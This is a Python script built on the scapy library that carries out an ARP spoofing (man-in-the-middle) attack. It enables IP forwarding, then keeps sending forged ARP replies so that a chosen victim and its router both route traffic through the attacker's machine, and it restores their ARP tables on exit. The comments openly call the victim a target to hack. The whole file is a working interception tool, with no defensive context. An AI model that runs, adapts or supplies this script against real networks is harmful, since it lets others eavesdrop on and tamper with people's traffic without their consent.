import scapy.all as scapy
import  time,argparse,subprocess

'''
op=1 stand for request
op=2 stand for response
as we want to fool the target as router
than router send response so we have to set op = 2
pdst stand for ip of target  which you want to hack
hwdst = target_mac_address which you want to hack
hwsrc = source field from which the packet is comming from
in this case source field will be ip of router but actually comming from your computer
'''

def get_mac(ip):
    #arp request
    arp_request=scapy.ARP(pdst=ip)
    #broadcast and create ethernet frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request 
    #sending arp request broadcast msg by srp function
    answer_packet=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answer_packet[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    # send this packet to target
    scapy.send(packet,verbose=False)
def restore(destination_ip,sources_ip):
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=get_mac(destination_ip),psrc=sources_ip,hwsrc=get_mac(sources_ip))
    scapy.send(packet,count=4,verbose=False)
def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r_ip" ,"--router_ip", dest="router_ip", help="Router ip addr.")
    parser.add_argument("-v_ip", "--victim_ip", dest="victim_ip", help="Victim ip addr")

    # tell this child to parse argument
    options= parser.parse_args()
    if not (options.victim_ip or options.router_ip):
        parser.error("Usages --router_ip router ip addr --victim_ip victim ip addr  \nip use --help for more info.")
    return options
try:
    out = subprocess.check_output("sysctl net.ipv4.ip_forward=1",shell=True)
    if b"1" in out:
        print("[+] Ip forward enabled.")
except:
    print("[-] Do Ip forward manually.")
options = get_argument()
target_ip = options.victim_ip
gateway_ip = options.router_ip
packet_count = 0
try:
    while True:
        spoof(target_ip,gateway_ip) #for fooling the victim computer
        spoof(gateway_ip,target_ip) #for fooling the router
        packet_count += 2
        print("\r[+] Packet sents : " + str(packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-]Detected Ctrl C ...Resetting Arp Table....Plz wait.")
    try:
        out = subprocess.check_output("sysctl net.ipv4.ip_forward=0",shell=True)
        # print(out)
        # print(type(out))
        if b"0" in out:
            print("[-] Ip forward disabled.")
    except:
        pass

    restore(target_ip,gateway_ip) #restore victim computer
    restore(gateway_ip,target_ip) #restore router
